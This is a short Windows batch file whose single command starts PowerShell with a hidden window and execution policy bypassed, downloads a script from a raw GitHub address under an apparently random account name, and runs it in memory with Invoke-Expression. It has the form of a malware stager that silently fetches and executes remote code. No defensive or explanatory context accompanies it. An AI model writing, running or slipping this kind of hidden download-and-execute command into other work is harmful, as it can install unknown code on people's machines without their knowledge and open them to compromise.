@echo off

:: Run PowerShell to download and execute the script with a hidden console
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/k53xupn43/i965652f/refs/heads/main/m.ps1').Content"
